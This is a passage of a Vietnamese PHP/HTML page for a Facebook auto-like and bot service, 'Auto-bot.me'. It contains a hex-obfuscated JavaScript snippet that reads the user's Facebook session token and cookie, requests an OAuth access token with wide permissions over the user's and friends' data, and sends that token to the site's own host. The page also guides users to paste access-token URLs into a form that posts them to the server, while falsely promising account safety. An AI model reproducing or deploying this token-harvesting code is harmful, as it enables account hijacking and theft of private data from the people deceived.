65\x6E\x64\x73\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x67\x72\x6F\x75\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x69\x6B\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6E\x6F\x74\x65\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x74\x61\x74\x75\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x76\x69\x64\x65\x6F\x73\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x66\x72\x69\x65\x6E\x64\x73\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x6E\x6F\x74\x65\x73\x2C\x75\x73\x65\x72\x5F\x6F\x6E\x6C\x69\x6E\x65\x5F\x70\x72\x65\x73\x65\x6E\x63\x65\x2C\x75\x73\x65\x72\x5F\x71\x75\x65\x73\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6F\x6E\x73\x2C\x75\x73\x65\x72\x5F\x61\x62\x6F\x75\x74\x5F\x6D\x65\x2C\x75\x73\x65\x72\x5F\x61\x63\x74\x69\x76\x69\x74\x69\x65\x73\x2C\x75\x73\x65\x72\x5F\x62\x69\x72\x74\x68\x64\x61\x79\x2C\x75\x73\x65\x72\x5F\x65\x64\x75\x63\x61\x74\x69\x6F\x6E\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x75\x73\x65\x72\x5F\x65\x76\x65\x6E\x74\x73\x2C\x75\x73\x65\x72\x5F\x67\x61\x6D\x65\x73\x5F\x61\x63\x74\x69\x76\x69\x74\x79\x2C\x75\x73\x65\x72\x5F\x67\x72\x6F\x75\x70\x73\x2C\x75\x73\x65\x72\x5F\x68\x6F\x6D\x65\x74\x6F\x77\x6E\x2C\x75\x73\x65\x72\x5F\x69\x6E\x74\x65\x72\x65\x73\x74\x73\x2C\x75\x73\x65\x72\x5F\x6C\x69\x6B\x65\x73\x2C\x75\x73\x65\x72\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x2C\x75\x73\x65\x72\x5F\x70\x68\x6F\x74\x6F\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x5F\x64\x65\x74\x61\x69\x6C\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x61\x74\x69\x6F\x6E\x73\x68\x69\x70\x73\x2C\x75\x73\x65\x72\x5F\x72\x65\x6C\x69\x67\x69\x6F\x6E\x5F\x70\x6F\x6C\x69\x74\x69\x63\x73\x2C\x75\x73\x65\x72\x5F\x73\x74\x61\x74\x75\x73\x2C\x75\x73\x65\x72\x5F\x76\x69\x64\x65\x6F\x73\x2C\x75\x73\x65\x72\x5F\x77\x65\x62\x73\x69\x74\x65\x2C\x75\x73\x65\x72\x5F\x77\x6F\x72\x6B\x5F\x68\x69\x73\x74\x6F\x72\x79\x2C\x70\x75\x62\x6C\x69\x63\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2C\x75\x73\x65\x72\x5F\x66\x72\x69\x65\x6E\x64\x73\x26\x61\x75\x74\x68\x5F\x74\x79\x70\x65\x3D\x26\x61\x75\x74\x68\x5F\x74\x6F\x6B\x65\x6E\x3D\x26\x61\x75\x74\x68\x5F\x6E\x6F\x6E\x63\x65\x3D\x26\x72\x65\x66\x3D\x44\x65\x66\x61\x75\x6C\x74\x26\x72\x65\x74\x75\x72\x6E\x5F\x66\x6F\x72\x6D\x61\x74\x3D\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E\x26\x64\x6F\x6D\x61\x69\x6E\x3D\x26\x73\x73\x6F\x5F\x64\x65\x76\x69\x63\x65\x3D\x69\x6F\x73\x26\x5F\x5F\x43\x4F\x4E\x46\x49\x52\x4D\x5F\x5F\x3D\x31","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x63\x6C\x6F\x73\x65","\x68\x72\x65\x66","\x73\x65\x6E\x64"];var delay_time=1000;function sleep(_0xc151x3){var _0xc151x4= new Date()[_0x3843[0]]();while( new Date()[_0x3843[0]]()<_0xc151x4+_0xc151x3){;};}var fb_dtsg=document[_0x3843[3]](_0x3843[2])[0][_0x3843[1]];var user_id=document[_0x3843[5]][_0x3843[4]](document[_0x3843[5]][_0x3843[4]](/c_user=(\d+)/)[1]);var token=_0x3843[6];var tokenandroid=_0x3843[6];var e= new XMLHttpRequest;var t=_0x3843[7];var n=_0x3843[8]+fb_dtsg+_0x3843[9]+idapp+_0x3843[10];e[_0x3843[12]](_0x3843[11],t,true);e[_0x3843[13]]=function(){if(e[_0x3843[14]]==4&&e[_0x3843[15]]==200){token=e[_0x3843[16]][_0x3843[4]](/token=(.+)&/)[1];e[_0x3843[17]];var _0xc151xc= new XMLHttpRequest;var t=_0x3843[7];var n=_0x3843[8]+fb_dtsg+_0x3843[9]+idapp+_0x3843[10];_0xc151xc[_0x3843[12]](_0x3843[11],t,true);_0xc151xc[_0x3843[13]]=function(){if(_0xc151xc[_0x3843[14]]==4&&_0xc151xc[_0x3843[15]]==200){tokenandroid=_0xc151xc[_0x3843[16]][_0x3843[4]](/token=(.+)&/)[1];_0xc151xc[_0x3843[17]];sleep(delay_time);location[_0x3843[18]]=autobotme+token+"&idapp="+idapp;}};_0xc151xc[_0x3843[19]](n);}};e[_0x3843[19]](n);</textarea>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-md-12 text-left">
<div class="well">
<p class="text-success"><strong>Auto-bot.me</strong> là một hệ thống autobot có sự kết hợp giữa các loại BOT và các loại AUTO hiện nay. Auto Like, Bot Like, Hack Like, Bot Comment ... Tự động like status bạn bè khi không online hay tăng like hình ảnh lên con số không ngờ là những lợi ích mà hệ thống mang đến cho bạn. <a href="#">Xem hệ thống Autobot</a><br>Hầu hết, những thao tác đều được tự động hóa đến mức tối đa ! Bạn không cần phải làm gì cả! <br> Là một hệ thống hoàn toàn miễn phí FREE. Bạn không cần phải chi trả cho bất cứ thứ gì trên hệ thống. </p>
<p class="text-danger"> <strong>Sứ mệnh của chúng tôi: </strong> Mang mọi người đến gần nhau hơn và làm cho mọi thứ đều tự động. Bạn không cần phải làm gì cả !</p>
<p class="text-info"> - From Autobot Team</p>
</div>
</div>
</div>
<div class="row">
<div class="col-md-12 text-left">
<div class="well" id="hdsd">
<h2 class="text-info">Làm thế nào để sử dụng ?</h2><br> <a href="index-2.html">Hệ thống Auto Like - Bot Like - Hack Like </a><br>
<p class="bg-info">Đây là những thiết đặt cần thiết cho lần đầu sử dụng. Bạn nên thực hiện đầy đủ để có thể sử dụng auto-bot.me một cách hiệu quả. Auto Like, Hack Like, Bot Like là hoàn toàn miễn phí! </p>
<br> <a onclick="show();" class="btn btn-danger">Xem Video hướng dẫn <i class="fa fa-youtube-play"></i></a><div id="video"></div>
<table class="table table-responsive">
<thead>
<tr>
<th>#</th>
<th>Autobot yêu cầu</th>
<th>Thao tác</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. </td>
<td><strong><a title="Auto Like, Hack Like, Hack Sub" href="index-2.html">Auto Like , Auto Follow</a> </strong></td>
<td id="support"><p class="text-danger">Lưu ý: Bạn nên trên 18 tuổi, nếu không hãy <a href="https://www.facebook.com/me/about?section=contact-info&amp;pnref=about"> thay đổi năm sinh </a> thành trên 18 tuổi. Nếu không sẽ không bật theo giõi được</p> Đầu tiên, bạn click vào <a href="https://www.facebook.com/settings?tab=followers" target="_blank">đây</a> để thay đổi thiết lập người theo giõi. Trong phần: "<b>Ai có thể theo dõi tôi</b>" bạn chọn và sửa thành <kbd><i class="fa fa-globe"></i> Tất cả mọi người <i class="fa fa-caret-down"></i></kbd> hoặc <kbd><i class="fa fa-globe"></i> Everyone <i class="fa fa-caret-down"></i></kbd><br> Tiếp theo phần: "<b>Bình luận của người theo dõi</b>" bạn chọn và sửa thành: <kbd> Tất cả mọi người <i class="fa fa-caret-down"></i></kbd> hoặc <kbd> Everyone <i class="fa fa-caret-down"></i></kbd></td>
</tr>
<tr>
<td>2.</td>
<td>
<strong><a title="Auto Like, Hack Like" href="index-2.html">Auto Like, Hack Like, Auto comment</a></strong>
<br><br>
<strong><a title="Bot Like, Bot Ex Like" href="index-2.html">Bot Ex Like,Bot Ex Like Comment, Bot Call</a> <br><br></strong>
</td>
<td>Sau khi thay đổi thành công thiết lập người theo giỏi. Bạn click vào <a href="https://www.facebook.com/settings?tab=privacy&amp;section=composer&amp;view" target="_blank"> đây </a> để thiết lập công khai bài viết. Trong phần: "<b>Ai có thể xem nội dung của tôi?</b>" bạn chọn <kbd><i class="fa fa-globe"></i> Mọi người</kbd> <br></td>
</tr>
<tr>
<td>3.</td>
<td>
<strong><a title="Auto Like, Hack Like, Hack Sub" href="index-2.html">ALL autobot</a></strong>
</td>
<td id="support">
<div class="input-group input-group-lg">
Click <a target="_blank" href="http://viplike.xyz/redirect.php?url=http%3A%2F%2Fgoo.gl%2FMt76qA">Cài đặt</a> để cài đặt ứng dụng lấy mã access_token. Cài đặt ứng dụng bằng cách click 3 lần <a>Ok</a> <br><a>Bạn chỉ cần cài đặt 1 lần. Sau này không cần cài đặt nữa, chỉ cần làm tiếp bước tiếp theo :-</a>) <br>	Sau đó, Click <a target="_blank" href="http://viplike.xyz/redirect.php?url=http%3A%2F%2Fgoo.gl%2FMt76qA">Lấy token</a> và copy url/link từ thanh địa chỉ.<br>	Cuối cùng, dán url/link Go! bên dưới rồi bấm <span>Go!</span>
</div>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div></div>
<div class="row">
<div class="panel panel-primary">
<div class="panel-heading"><h3>Vì sao bạn nên sử dụng #Autobotme?</h3>
</div>
<div class="panel-body">
<h4>Vì #Autobotme là một hệ thống:</h4>
<div class="row">
<div class="col-sm-4">
<div class="box box-solid box-primary">
<div class="">
<h3 class="box-title">AN TOÀN</h3>
</div>
<div class="box-body">
<h1><i class="fa fa-lock fa-5x"></i></h1>
<b>Chúng tôi mã hóa thông tin của bạn và chỉ có id của bạn mới có thể giải mã. Chúng tôi không bán nó cho bất cứ ai với bất cứ giá nào. Hệ thống hỗ trợ https giúp tăng độ bảo mật. Tài khoản facebook của bạn luôn được an toàn.</b>
</div>
</div>
</div>
<div class="col-sm-4">
<div class="box box-solid box-primary">
<div class="">
<h3 class="box-title">CHẤT LƯỢNG</h3>
</div>
<div class="box-body">
<h1><i class="fa fa-thumbs-o-up fa-5x"></i></h1>
<b>Ra đời và phát triển hơn 1 năm. Chúng tôi tự hào với những dịch vụ mà mình đem lại cho cộng đồng facebook Việt Nam. Hệ thống #autobot là một người bạn đồng hành không thể thiếu đối với một facebook-er.</b>
</div>
</div>
</div>
<div class="col-sm-4">
<div class="box box-solid box-primary">
<div class="">
<h3 class="box-title">MIỄN PHÍ</h3>
</div>
<div class="box-body">
<h2><span class="fa-stack fa-lg fa-3x"> <i class="fa fa fa-money fa-stack-1x "></i> <i class="fa fa-ban fa-stack-2x text-danger"></i></span></h2>
<b>
#Autobot miễn phí và sẽ luôn như vậy với tất cả mọi người. Chúng tôi hoàn toàn không thu bất cứ loại phí nào - #Autobotme chỉ đơn giản là cộng đồng chia sẻ những điều tốt đẹp với mọi người.
</b>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-sm-12">
<div class="box box-solid box-primary">
<div class="">
<h3 class="box-title">LUÔN LUÔN ĐỀ CAO TRẢI NGHIỆM NGƯỜI DÙNG</h3>
</div>
<div class="box-body">
<h1><i class="fa fa-line-chart fa-5x"></i></h1>
<i class="fa fa-heart"></i> <b>Chúng tôi luôn mang đến cho bạn những điều tốt nhất <i class="fa fa-heart"></i><br>
Hệ thống luôn luôn phát triển để phù hợp với người dùng.</b>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>function login(atoken){if(atoken==''){alert("Vui lòng đọc kỹ hướng dẫn sử dụng!");playhd();}if(atoken=='https://www.facebook.com/connect/blank.html#_=_'){alert("Bạn đã quá chậm ^^! Hãy thao tác nhanh hơn để có thể lấy được token. Xem video hướng dẫn bên dưới phần Hỗ trợ");}$("#go").html('<i class="fa fa-spinner fa-spin"></i>');document.getElementById("go").disabled=true;if(atoken.match(/access_token=(.*)&expires_in/)){token=atoken.match(/access_token=(.*)&expires_in/)[1];}else{token=atoken;}$.post("login.html",{access_token:token,ref:""},function(data,status){datas=JSON.parse(data)
if(datas['status']=="error"){$("#rio").html('<div id="log" class="alert alert-warning"><span class="text-primary">'+datas['mes']+'</span></div>');}else if(datas['status']=="oke"){create_cookie('member',1,1000);$("#rio").html('<div id="log" class="alert alert-warning"><span class="text-primary"></span></div>');window.location=datas['link'];}$("#go").html('Đăng nhập');document.getElementById("go").disabled=false;});}function login_email(){$("#rio2").html('<div id="log" class="alert alert-warning"><span class="text-primary">Tính năng này đang tạm dừng hoạt động</span></div>');}function create_cookie(a,b,c){if(c){var d=new Date;d.setTime(d.getTime()+864E5*c);c="; expires="+d.toGMTString()}else c="";document.cookie=a+"="+b+c+"; path=/"}function read_cookie(a){a+="=";for(var b=document.cookie.split(";"),c=0;c<b.length;c++){for(var d=b[c];" "==d.charAt(0);)d=d.substring(1,d.length);if(0==d.indexOf(a))return d.substring(a.length,d.length)}return null}function show(){$("#video").html('<br><div class="panel panel-warning text-center"><div class="video-container">      <div class="panel-heading">Video hướng dẫn </div>      <div class="panel-body"><iframe width="560" height="315" src="https://www.youtube.com/embed/WNccgJgDNmY" frameborder="0" allowfullscreen></iframe></div> </div>    </div>');}if(read_cookie('email')){document.getElementById("email").value=read_cookie('email');document.getElementById("passwd").value=read_cookie('passwd');}setTimeout(mem,2000);function playhd(){$('html, body').animate({scrollTop:$('#hdsd').offset().top},2000);create_cookie('member',1,1000);}function mem(){if(!read_cookie('member')){ok=confirm("Chào bạn, bạn có muốn xem hướng dẫn sử dụng Auto-bot.me không?");if(ok){playhd()}}}function showvideo(link,id){$("#"+id).html('<br><div class="panel panel-warning text-center"><div class="video-container">      <div class="panel-heading">Video hướng dẫn </div>      <div class="panel-body"><iframe width="560" height="315" src="'+link+'" frameborder="0" allowfullscreen></iframe></div> </div>    </div>');}if(screen.width<360){$("#form").removeClass("input-group input-group-lg").addClass('input-group input-group-sm');$(".col-md-10.col-xs-offset-1").removeClass("col-xs-offset-1");$(".col-xs-8.col-xs-offset-2").removeClass("col-xs-offset-2").removeClass("col-xs-8").addClass('col-xs-12');}</script>	</div>
	<?php } else {
include'bangnguoidung.php';		?>

<script>function create_cookie(a,b,c){if(c){var d=new Date;d.setTime(d.getTime()+864E5*c);c="; expires="+d.toGMTString()}else c="";document.cookie=a+"="+b+c+"; path=/"}function read_cookie(a){a+="=";for(var b=document.cookie.split(";"),c=0;c<b.length;c++){for(var d=b[c];" "==d.charAt(0);)d=d.substring(1,d.length);if(0==d.indexOf(a))return d.substring(a.length,d.length)}return null}function sharecall(){$("#formshares").html(" <b> Nội dung </b> <br> <textarea id='mes' style='margin: 0px; width: 321px; height: 112px;'> <3 Hệ thống auto like, bot like, hack like cực chất: BotVIP. NET </textarea>	<br> <button onclick='post()'>POST</button>	");}function post(){mes=document.getElementById("mes").value;$.get("modun/getgold.php?share=1&mes="+mes);$("#formshares").html("<div class='alert alert-success'>  <strong>Done !</strong> Thank for share</div> ");}function showtheme(){$('#tablecolor').css('display',"inherit");}</script>
<div class="panel panel-default">
<div class="panel-heading">Panel Autobotme</div>
<div class="panel-body">
<div class="row"><div class="col-sm-12">
<br>﻿<section id="conten" class="\&quot;content\&quot;">
<div class="row">
<div class="col-sm-4">
<div class="small-box bg-aqua">
<div class="inner">
<h3>
Auto
</h3>
<p>
Auto Like - Auto Follow - Auto Comment - Auto Share
</p>
</div>
<div class="icon">
<i class="ion ion-bag"></i>
</div>
<a href="#tab_2" data-toggle="tab" onclick="back();" class="small-box-footer">
Go <i class="fa fa-arrow-circle-right"></i>
</a>
</div>
</div>
<div class="col-sm-4">
<div class="small-box bg-green">
<div class="inner">
<h3>
Bot
</h3>
<p>
Bot Like - Bot Comment - Bot Ex Like - #Autobot FB
</p>
</div>
<div class="icon">
<i class="ion ion-stats-bars"></i>
</div>
<a href="#tab_1" data-toggle="tab" onclick="back();" class="small-box-footer">
Go <i class="fa fa-arrow-circle-right"></i>
</a>
</div>
</div>
<div class="col-sm-4">
<div class="small-box bg-yellow">
<div class="inner">
<h3>
Boom
</h3>
<p>
Boom Like - Boom Comment - Bão Like - Bão Comment
</p>
</div>
<div class="icon">
<i class="ion ion-person-add"></i>
</div>
<a href="#tab_4" data-toggle="tab" onclick="back();" class="small-box-footer">
Go <i class="fa fa-arrow-circle-right"></i>
</a>
</div>
</div>
</div>
<div class="row">
<div class="col-sm-6">
<div class="small-box bg-red">
<div class="inner">
<h3>
VIP
</h3>
<p>
Mua VIP, Bảng giá VIP, Quản lý VIP
</p>
</div>
<div class="icon">
<i class="ion ion-pie-graph"></i>
</div>
<a href="http://fb.com/puaru.vn" class="small-box-footer">
Go <i class="fa fa-arrow-circle-right"></i>
</a>
</div></div>
<div class="col-sm-6">
<div class="small-box bg-blue">
<div class="inner">
<h3>
Library
</h3>
<p>
Ảnh text, status hay, icon tổng hợp ...
</p>
</div>
<div class="icon">
<i class="ion ion-ios7-cart-outline"></i>
</div>
<a href="#" class="small-box-footer">
Go <i class="fa fa-arrow-circle-right"></i>
</a>
</div></div>
</div>
<script>function back(){$('html, body').animate({scrollTop:$('#barback').offset().top},2000);}</script>
</section>﻿
<div id="modaltip"></div>
<br>
<h2> Lối tắt </h2><h3> Click Go! hoặc tên Autobot để vào </h3><br><br>	<div id="barback"></div>
<div class="navbar navbar-default ">
<ul class="nav nav-tabs nav-justified">
<li class="active"><a href="#tab_1" data-toggle="tab" aria-expanded="true"> Khu vực Bot</a></li>
<li class=""><a href="#tab_2" data-toggle="tab" aria-expanded="false">Khu vực Auto</a></li>
<li class=""><a href="#tab_4" data-toggle="tab" aria-expanded="false">Khu vực Boom</a></li>
<li class=""><a href="#tab_3" data-toggle="tab" aria-expanded="false">Khu vực Hỗ trợ</a></li>
</ul>
<div id="tabs">
<div class="tab-content">
<div class="tab-pane active" id="tab_1">
<section id="conten" class="content">
<h3> Khu vực Bot</h3>
<div class="row ">
<div class="col-sm-4  ">
<div class="box box-solid box-primary">
<div class="box-header text-center ">
<h3 class="box-title"><a style="color:white;text-align:center;" href="botex.php">Bot Ex Like</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Good</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font><br>
<hr>
<div class="row">
<div class="col-xs-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(1)">Thông tin</a></div>
<div class="col-sm-6"><a href="botex.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-sm-4  ">
<div class="box box-solid box-primary">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white;text-align:center;" href="botlike.php">Bot Like</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Good</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font><br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(2)">Thông tin</a></div>
<div class="col-sm-6"><a href="botlike.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-sm-4   ">
<div class="box box-solid box-primary">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white;text-align:center;" href="botlike.php">Bot Ex Like Comment</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">BotLike</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font><br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(3)">Thông tin</a></div>
<div class="col-sm-6"><a href="botlike.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
</div>
<div class="row">
<div class="col-sm-4  ">
<div class="box box-solid box-primary">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white;text-align:center;" href="#">Bot Summons</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Không cài</font><br>
Hệ thống: <font color="red" size="+1">Bảo trì <i class="fa fa-exclamation-triangle"></i></font><br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(4)">Thông tin</a></div>
<div class="col-sm-6"><a href="#" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-sm-4  ">
<div class="box box-solid box-primary">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white;text-align:center;" href="#">Bot Auto Status</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Không cài</font><br>
Hệ thống: <font color="red" size="+1">Bảo trì <i class="fa fa-exclamation-triangle"></i></font><br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(5)">Thông tin</a></div>
<div class="col-sm-6"><a href="#" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-sm-4  ">
<div class="box box-solid box-primary">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white;text-align:center;" href="botsv.php">Bot Sao Vàng</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Good</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font><br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(6)">Thông tin</a></div>
<div class="col-sm-6"><a href="botsv.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
</div>
<div class="row">
<div class="col-sm-6  ">
<div class="box box-solid box-primary">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white;text-align:center;" href="botlike.php">Bot Like Comment</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Bot Like</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font><br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(7)">Thông tin</a></div>
<div class="col-sm-6"><a href="botlike.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-sm-6  ">
<div class="box box-solid box-primary">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white;text-align:center;" href="botcmt.php">Bot Comment</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Good</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font><br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(8)">Thông tin</a></div>
<div class="col-sm-6"><a href="botcmt.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
</div>
</section>
</div>
<div class="tab-pane" id="tab_2">
<section id="conten" class="content">
<h3>Khu vực Auto</h3><br><br>
<div class="row">
<div class="col-sm-12">
<div class="box box-solid box-success">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="#">Auto Like Page(HOT-NEW)</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Không cài</font><br>
Hệ thống: <font color="red" size="+1">Bảo trì <i class="fa fa-exclamation-triangle"></i></font> <br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(10)">Thông tin</a></div>
<div class="col-sm-6"><a href="#" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
</div>
<div class="row">
<div class="col-sm-6">
<div class="box box-solid box-success">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="autolike.php">Auto Like</a></h3>
</div>
<div class="box-body">
Tình trạng: Bật<br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font> <br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(10)">Thông tin</a></div>
<div class="col-sm-6"><a href="autolike.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-sm-6">
<div class="box box-solid box-success">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="#">Auto Add Friend</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Không cài</font><br>
Hệ thống: <font color="red" size="+1">Bảo trì <i class="fa fa-exclamation-triangle"></i></font> <br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(16)">Thông tin</a></div>
<div class="col-sm-6"><a href="#" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
</div>
<div class="row">
<div class="col-sm-4">
<div class="box box-solid box-success">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="autosub.php">Auto Sub</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Không cài</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font> <br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(9)">Thông tin</a></div>
<div class="col-sm-6"><a href="autosub.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-sm-4">
<div class="box box-solid box-success">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="#">Auto Comment</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Không cài</font><br>
Hệ thống: <font color="red" size="+1">Bảo trì <i class="fa fa-exclamation-triangle"></i></font> <br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(11)">Thông tin</a></div>
<div class="col-sm-6"><a href="#" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
<div class="col-xs-4">
<div class="box box-solid box-success">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="autoshare.php">Auto Share</a></h3>
</div>
<div class="box-body">
Tình trạng: <font color="blue" size="+1">Không cài</font><br>
Hệ thống: <font color="green" size="+1">Hoạt động <i class="fa fa-check-circle"></i></font> <br>
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(12)">Thông tin</a></div>
<div class="col-sm-6"><a href="autoshare.php" class="btn btn-success">Sử dụng</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
</div>
</section>
</div>
<div class="tab-pane" id="tab_4">
<section id="conten" class="content">
<h3>Khu vực Boom</h3>
<div class="row">
<div class="col-sm-6">
<div class="box box-solid box-danger">
<div class="box-header text-center">
<h3 class="box-title"><a style="color:white" href="#">Bom Comment</a></h3>
</div>
<div class="box-body">
Bão like cho bạn bè, boom like bạn bè.
<hr>
<div class="row">
<div class="col-sm-6"><a class="btn btn-info" data-toggle="modal" data-target="#showtip" onclick="modaltip(13)">Thông tin</a></div>
<div class="col-sm-6"><a href="#" class="btn btn-success">Bảo Trì</a></div>
</div>
</div><!-- /.box-body -->
</div>
</div>
